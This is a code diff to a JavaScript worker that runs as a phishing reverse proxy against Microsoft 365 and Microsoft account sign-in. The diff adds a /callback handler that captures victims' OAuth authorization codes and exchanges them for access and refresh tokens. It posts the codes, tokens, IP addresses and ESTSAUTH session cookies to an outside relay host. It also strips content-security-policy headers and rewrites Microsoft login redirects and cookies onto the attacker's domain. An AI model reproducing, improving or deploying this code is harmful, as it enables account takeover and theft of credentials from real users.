@@ -5,11 +5,11 @@ const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
 const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
-// OAuth Configuration - Using Microsoft's native client flow
+// OAuth Configuration
 const OAUTH_CONFIG = {
   client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
   resource: 'https://graph.microsoft.com',
-  redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
+  redirect_uri: `https://${YOUR_DOMAIN}/callback`,  // Changed to point to our domain
   authority: 'https://login.microsoftonline.com/common',
   upstream: 'login.microsoftonline.com'
 };
@@ -22,16 +22,6 @@ async function sendToVercel(type, data) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
-    });
-  } catch (e) {}
-}
-
-async function sendToTeams(message, webhookUrl) {
-  try {
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text: message }),
     });
   } catch (e) {}
 }
@@ -67,8 +57,7 @@ async function exchangeCodeForTokens(code) {
       accessToken: tokenData.access_token,
       refreshToken: tokenData.refresh_token,
       expiresIn: tokenData.expires_in,
-      tokenType: tokenData.token_type,
-      resource: tokenData.resource
+      tokenType: tokenData.token_type
     };
   } catch (error) {
     console.error('Token exchange error:', error);
@@ -76,7 +65,7 @@ async function exchangeCodeForTokens(code) {
   }
 }
 
-// ==================== SIMPLE PROXY HANDLER ====================
+// ==================== MAIN HANDLER ====================
 
 export default async function handleRequest(request) {
   const url = new URL(request.url);
@@ -86,7 +75,56 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  // Handle root path - redirect to Microsoft OAuth authorization endpoint
+  // ==================== HANDLE CALLBACK (CODE CAPTURE) ====================
+  if (url.pathname === '/callback') {
+    const code = url.searchParams.get('code');
+    
+    if (code) {
+      console.log(`[AUTH CODE] Captured: ${code}`);
+      
+      // Send the code to Vercel
+      await sendToVercel('auth_code', { ip, code, url: url.href });
+      
+      // Exchange the code for tokens
+      try {
+        const tokens = await exchangeCodeForTokens(code);
+        console.log(`[TOKENS] Access Token obtained: ${tokens.accessToken.substring(0, 50)}...`);
+        
+        // Send tokens to Vercel
+        await sendToVercel('tokens', { 
+          ip, 
+          accessToken: tokens.accessToken,
+          refreshToken: tokens.refreshToken,
+          expiresIn: tokens.expiresIn,
+          tokenType: tokens.tokenType
+        });
+        
+        // Also send as file for easy access
+        const formData = new FormData();
+        formData.append('file', new Blob([`IP: ${ip}\nCode: ${code}\nAccess Token: ${tokens.accessToken}\nRefresh Token: ${tokens.refreshToken}\nExpires In: ${tokens.expiresIn}`], { type: 'text/plain' }), `${ip}-TOKENS.txt`);
+        await fetch(VERCEL_URL, { method: 'POST', body: formData });
+        
+      } catch (tokenError) {
+        console.error('[TOKEN ERROR]', tokenError);
+        await sendToVercel('token_error', { ip, error: tokenError.message });
+      }
+      
+      // Redirect to success page or portal
+      return new Response(null, {
+        status: 302,
+        headers: {
+          'Location': 'https://portal.office.com',
+          'Access-Control-Allow-Origin': '*',
+          'Access-Control-Allow-Credentials': 'true'
+        }
+      });
+    } else {
+      // No code in callback - show error
+      return new Response('Authentication failed: No code received', { status: 400 });
+    }
+  }
+
+  // ==================== HANDLE ROOT - START OAuth FLOW ====================
   if (url.pathname === '/' || url.pathname === '') {
     const authUrl = `https://${OAUTH_CONFIG.upstream}/common/oauth2/authorize?` + new URLSearchParams({
       response_type: 'code',
@@ -95,7 +133,7 @@ export default async function handleRequest(request) {
       redirect_uri: OAUTH_CONFIG.redirect_uri
     }).toString();
     
-    console.log(`[REDIRECT] Root -> ${authUrl}`);
+    console.log(`[REDIRECT] Starting OAuth flow -> ${authUrl}`);
     return new Response(null, {
       status: 302,
       headers: {
@@ -106,11 +144,11 @@ export default async function handleRequest(request) {
     });
   }
 
-  // Handle all other requests as a transparent proxy
+  // ==================== PROXY ALL OTHER REQUESTS ====================
+  // Handle proxied requests (/_p/domain/path)
   let targetHost = OAUTH_CONFIG.upstream;
   let targetPath = url.pathname;
   
-  // If it's a proxied request (starts with /_p/), extract the domain
   if (url.pathname.startsWith('/_p/')) {
     const withoutPrefix = url.pathname.slice(3);
     const slashIndex = withoutPrefix.indexOf('/');
@@ -126,15 +164,17 @@ export default async function handleRequest(request) {
   // Build request headers
   const headers = new Headers();
   
-  // Copy relevant headers
-  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin'];
+  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'cookie'];
   for (const h of headersToCopy) {
     const val = request.headers.get(h);
     if (val) headers.set(h, val);
   }
   
   headers.set('Host', targetHost);
-  headers.set('Referer', `https://${targetHost}/`);
+  
+  if (!headers.has('referer')) {
+    headers.set('Referer', `https://${targetHost}/`);
+  }
   
   // Remove problematic headers
   headers.delete('content-length');
@@ -180,74 +220,19 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     });
     
-    // Handle redirects - THIS IS WHERE WE CAPTURE THE AUTH CODE
-    if (response.status === 302 && response.headers.has('Location')) {
-      const location = response.headers.get('Location');
-      console.log(`[REDIRECT] 302 -> ${location}`);
-      
-      // Check if this redirect contains the authorization code
-      if (location.includes('nativeclient?code=')) {
-        const codeMatch = location.match(/nativeclient\?code=([^&]+)/);
-        if (codeMatch && codeMatch[1]) {
-          const authCode = codeMatch[1];
-          console.log(`[AUTH CODE] Captured: ${authCode}`);
-          
-          // Send the code to Vercel
-          await sendToVercel('auth_code', { ip, code: authCode, url: url.href });
-          
-          // Exchange the code for tokens
-          try {
-            const tokens = await exchangeCodeForTokens(authCode);
-            console.log(`[TOKENS] Access Token obtained: ${tokens.accessToken.substring(0, 50)}...`);
-            
-            // Send tokens to Vercel
-            await sendToVercel('tokens', { 
-              ip, 
-              accessToken: tokens.accessToken,
-              refreshToken: tokens.refreshToken,
-              expiresIn: tokens.expiresIn,
-              tokenType: tokens.tokenType
-            });
-            
-            // Send formatted message to Teams/webhook
-            const message = `<b>Tokens obtained:</b><br><br>
-<b>Access Token:</b> ${tokens.accessToken}<br><br>
-<b>Refresh Token:</b> ${tokens.refreshToken}<br><br>
-<b>Expires In:</b> ${tokens.expiresIn} seconds<br>
-<b>IP:</b> ${ip}`;
-            
-            await sendToVercel('teams_message', { message, ip });
-            
-          } catch (tokenError) {
-            console.error('[TOKEN ERROR]', tokenError);
-            await sendToVercel('token_error', { ip, error: tokenError.message });
-          }
-        }
-      }
-      
-      // Always redirect to Office portal after capturing the code
-      return new Response(null, {
-        status: 302,
-        headers: {
-          'Location': 'https://portal.office.com',
-          'Access-Control-Allow-Origin': '*',
-          'Access-Control-Allow-Credentials': 'true'
-        }
-      });
-    }
-    
-    // Handle other redirects
+    // Handle redirects
     if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
-      const location = response.headers.get('Location');
-      let rewrittenLocation = location;
+      let location = response.headers.get('Location');
+      console.log(`[REDIRECT] ${response.status} -> ${location}`);
       
-      // Only rewrite if it's going to a Microsoft domain
-      if (location.includes('login.microsoftonline.com')) {
-        rewrittenLocation = location.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${YOUR_DOMAIN}`);
+      // Rewrite redirects to keep them within our proxy
+      if (location.includes('login.microsoftonline.com') || location.includes('login.live.com')) {
+        location = location.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${YOUR_DOMAIN}`);
+        location = location.replace(/https?:\/\/login\.live\.com/g, `https://${YOUR_DOMAIN}/_p/login.live.com`);
       }
       
       const redirectHeaders = new Headers();
-      redirectHeaders.set('Location', rewrittenLocation);
+      redirectHeaders.set('Location', location);
       redirectHeaders.set('Access-Control-Allow-Origin', '*');
       redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
       
@@ -260,28 +245,24 @@ export default async function handleRequest(request) {
     // Build response headers
     const responseHeaders = new Headers();
     
-    // Copy essential response headers
     const headersToCopyResponse = ['content-type', 'cache-control'];
     for (const h of headersToCopyResponse) {
       const val = response.headers.get(h);
       if (val) responseHeaders.set(h, val);
     }
     
-    // Remove security headers
     responseHeaders.delete('content-security-policy');
     responseHeaders.delete('content-security-policy-report-only');
     responseHeaders.delete('clear-site-data');
     
-    // Add CORS headers
     responseHeaders.set('Access-Control-Allow-Origin', '*');
     responseHeaders.set('Access-Control-Allow-Credentials', 'true');
     
     // Process cookies
     const cookies = response.headers.getSetCookie?.() || [];
-    let cookieStr = '';
     
     if (cookies.length) {
-      cookieStr = cookies.join('; ');
+      const cookieStr = cookies.join('; ');
       
       // Check for auth cookies
       const hasESTSAUTH = cookieStr.toLowerCase().includes('estsauth');
@@ -296,10 +277,11 @@ export default async function handleRequest(request) {
         await fetch(VERCEL_URL, { method: 'POST', body: formData });
       }
       
-      // Forward cookies to client (replace domain)
+      // Forward cookies to client
       for (const cookie of cookies) {
         let modifiedCookie = cookie;
         modifiedCookie = modifiedCookie.replace(/login\.microsoftonline\.com/g, YOUR_DOMAIN);
+        modifiedCookie = modifiedCookie.replace(/login\.live\.com/g, YOUR_DOMAIN);
         responseHeaders.append('Set-Cookie', modifiedCookie);
       }
     }
